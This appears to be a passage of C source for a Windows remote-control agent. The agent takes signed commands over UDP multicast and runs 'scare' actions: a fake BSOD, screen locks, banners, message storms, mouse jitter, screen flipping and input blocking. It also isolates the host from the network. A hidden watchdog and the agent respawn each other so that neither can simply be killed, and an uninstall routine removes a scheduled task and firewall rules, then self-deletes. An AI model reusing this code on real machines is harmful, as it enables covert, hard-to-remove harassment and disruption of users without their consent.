    } else if (!strcmp(action, "unisolate")) {
        do_isolate("", 0);
        send_reply(&to, task_id, "ok", 0, "restored");
    } else if (!strcmp(action, "bsod")) {
        start_scare(SCARE_BSOD, text_raw, 30000);
        send_reply(&to, task_id, "ok", 0, "bsod");
    } else if (!strcmp(action, "lock")) {
        start_scare(SCARE_LOCK, text_raw, 0);
        send_reply(&to, task_id, "ok", 0, "locked");
    } else if (!strcmp(action, "banner")) {
        start_scare(SCARE_BANNER, text_raw, 300000);
        send_reply(&to, task_id, "ok", 0, "banner");
    } else if (!strcmp(action, "fsmsg")) {
        start_scare(SCARE_FSMSG, text_raw, 15000);
        send_reply(&to, task_id, "ok", 0, "fsmsg");
    } else if (!strcmp(action, "msgloop")) {
        wchar_t* w = utf8_to_wide(text_raw[0] ? text_raw : "!");
        if (w) {
            HANDLE t = CreateThread(NULL, 0, msgloop_thread, w, 0, NULL);
            if (t) CloseHandle(t); else free(w);
        }
        send_reply(&to, task_id, "ok", 0, "storm");
    } else if (!strcmp(action, "mousejit")) {
        ResetEvent(g_panicEvent);
        HANDLE t = CreateThread(NULL, 0, jit_thread, NULL, 0, NULL);
        if (t) CloseHandle(t);
        send_reply(&to, task_id, "ok", 0, "jitter");
    } else if (!strcmp(action, "flip")) {
        do_flip();
        send_reply(&to, task_id, "ok", 0, "flipped");
    } else if (!strcmp(action, "swapmouse")) {
        SwapMouseButton(TRUE);
        send_reply(&to, task_id, "ok", 0, "swapped");
    } else if (!strcmp(action, "unlock")) {
        SetEvent(g_panicEvent);
        BlockInput(FALSE);
        SwapMouseButton(FALSE);
        if (g_flipped) do_unflip();
        if (g_scareWnd && IsWindow(g_scareWnd)) SendMessageW(g_scareWnd, WM_CLOSE, 0, 0);
        send_reply(&to, task_id, "ok", 0, "restored");
    } else if (!strcmp(action, "exit")) {
        /* clean shutdown: signal watchdog not to respawn, then quit */
        send_reply(&to, task_id, "ok", 0, "bye");
        if (g_exitEvent) SetEvent(g_exitEvent);
        Sleep(150);              /* let the reply leave the stack */
        ExitProcess(0);
        return;
    } else {
        send_reply(&to, task_id, "err", -1, "unknown action");
    }
}

/* ---------------- watchdog: mutual respawn + clean shutdown ---------------- */

static int process_exists_ex(const char* exeName, DWORD excludePid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    int found = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == excludePid) continue;
            if (!_stricmp(pe.szExeFile, exeName)) { found = 1; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

static int process_exists(const char* exeName) {
    return process_exists_ex(exeName, 0);
}

/* Terminate every process named exeName except ourselves. */
static void kill_others(const char* exeName) {
    DWORD me = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == me) continue;
            if (_stricmp(pe.szExeFile, exeName)) continue;
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
}

/* Spawn <same dir>/exeName hidden, with optional extra args. */
static void spawn_partner(const char* exeName, const char* extraArgs) {
    char path[MAX_PATH], cmd[MAX_PATH + 96];
    if (!GetModuleFileNameA(NULL, path, (DWORD)sizeof(path))) return;
    char* slash = strrchr(path, '\\');
    if (!slash) return;
    int room = (int)(sizeof(path) - (slash - path) - 1);
    _snprintf(slash + 1, room, "%s", exeName);
    path[sizeof(path) - 1] = '\0';
    if (extraArgs) _snprintf(cmd, sizeof(cmd), "\"%s\" %s", path, extraArgs);
    else           _snprintf(cmd, sizeof(cmd), "\"%s\"", path);
    cmd[sizeof(cmd) - 1] = '\0';
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, AGENT_DIR, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/* Agent-side guard thread: keep the watchdog alive until exit is set. */
static DWORD WINAPI guard_thread(LPVOID param) {
    HANDLE exitEv = (HANDLE)param;
    for (;;) {
        if (WaitForSingleObject(exitEv, 2000) == WAIT_OBJECT_0) break;
        if (!process_exists(WATCH_NAME)) spawn_partner(WATCH_NAME, "--watch");
    }
    return 0;
}

/* Watchdog role (skwatch.exe --watch): respawn the agent until exit is set. */
static int run_watchdog(void) {
    HANDLE exitEv = CreateEventA(NULL, TRUE, FALSE, EXIT_EVENT);
    if (!exitEv) return 1;
    HANDLE mutex = CreateMutexA(NULL, TRUE, WATCH_MUTEX);
    if (!mutex || GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    for (;;) {
        if (WaitForSingleObject(exitEv, 2000) == WAIT_OBJECT_0) break;
        if (!process_exists(AGENT_NAME)) spawn_partner(AGENT_NAME, NULL);
    }
    return 0;
}

/* skagent.exe --uninstall: remove persistence, stop both processes,
 * then wipe the install directory after this process exits. */
static int run_uninstall(void) {
    run_hidden("schtasks /Delete /F /TN " TASK_NAME " >nul 2>&1"
               " & netsh advfirewall firewall delete rule name=SKAgentIn >nul 2>&1"
               " & netsh advfirewall firewall delete rule name=SKAgentUDP >nul 2>&1");
    kill_others(WATCH_NAME);
    kill_others(AGENT_NAME);
    Sleep(1200);
    /* delayed wipe: executes after this launcher itself has exited */
    run_hidden("ping 127.0.0.1 -n 3 >nul & del /f /q C:\\Temp\\SK\\skagent.exe"
               " C:\\Temp\\SK\\skwatch.exe >nul 2>&1 & rd /s /q C:\\Temp\\SK >nul 2>&1");
    return 0;
}

/* Load the controller ECDSA public key. Missing file is not fatal: the main
 * loop retries per packet, so dropping pubkey.bin live activates the agent
 * without a restart. */
static int try_load_pubkey(void) {
    HANDLE f = CreateFileA(PUB_FILE, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return 0;
    DWORD rd = 0;
    int ok = 0;
    if (ReadFile(f, g_pub, SK_PUB_LEN, &rd, NULL) && rd == SK_PUB_LEN) ok = 1;
    CloseHandle(f);
    g_havePub = ok;
    return ok;
}

/* ---------------- entry ---------------- */

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, PSTR pCmdLine, int nShow) {
    (void)hInst; (void)hPrev; (void)pCmdLine; (void)nShow;

    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath))) return 1;
    const char* exeName = strrchr(exePath, '\\');
    exeName = exeName ? exeName + 1 : exePath;
    const char* cl = GetCommandLineA();

    /* maintenance modes run before any mutex/single-instance check */
    if (strstr(cl, "--uninstall")) return run_uninstall();

    if (!_stricmp(exeName, WATCH_NAME)) {
        /* watchdog role only via explicit --watch (double-click safety) */
        if (!strstr(cl, "--watch")) return 0;
        return run_watchdog();
    }

    HANDLE mutex = CreateMutexA(NULL, TRUE, AGENT_MUTEX);
    if (!mutex || GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    g_exitEvent = CreateEventA(NULL, TRUE, FALSE, EXIT_EVENT);
    if (g_exitEvent &&
        WaitForSingleObject(g_exitEvent, 0) == WAIT_OBJECT_0)
        return 0;   /* shutdown in progress: do not respawn */

    g_panicEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

    /* commands carry an ECDSA signature from the controller; the public
     * half is deployed next to us. Absent key = idle until it shows up. */
    try_load_pubkey();

    DWORD hn = sizeof(g_host) - 1;
    GetComputerNameA(g_host, &hn);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    /* multicast listener */
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return 1;
    BOOL reuse = TRUE;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(SK_MCAST_PORT);
    if (bind(sock, (const struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
        return 1;

    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr(SK_MCAST_GROUP);
    mreq.imr_interface.s_addr = htonl(INADDR_ANY);
    if (setsockopt(sock, IPPROTO_IP, IP_ADD_MEMBERSHIP,
                   (const char*)&mreq, sizeof(mreq)) == SOCKET_ERROR)
        return 1;

    /* reply socket (ephemeral source port) */
    g_replySock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    /* mutual respawn: watchdog watches us, our guard watches the watchdog */
    if (!process_exists(WATCH_NAME)) spawn_partner(WATCH_NAME, "--watch");
    HANDLE guard = CreateThread(NULL, 0, guard_thread, g_exitEvent, 0, NULL);
    if (guard) CloseHandle(guard);

    for (;;) {
        uint8_t buf[SK_MAX_PACKET];
        struct sockaddr_in from;
        int fromLen = sizeof(from);
        int n = recvfrom(sock, (char*)buf, sizeof(buf), 0,
                         (struct sockaddr*)&from, &fromLen);
        if (n <= 0) continue;

        if (!g_havePub) {
            try_load_pubkey();
            if (!g_havePub) continue;      /* no trust anchor yet: drop */
        }

        uint8_t msgType = 0;
        char json[SK_MAX_JSON + 1];
        if (sk_parse_packet(buf, (size_t)n, g_pub, &msgType, json,
                            sizeof(json)) != 0)
            continue;                      /* bad signature: drop */
        if (msgType != SK_MSG_COMMAND) continue;

        handle_command(json, &from);       /* dedup + re-reply inside */
    }
}
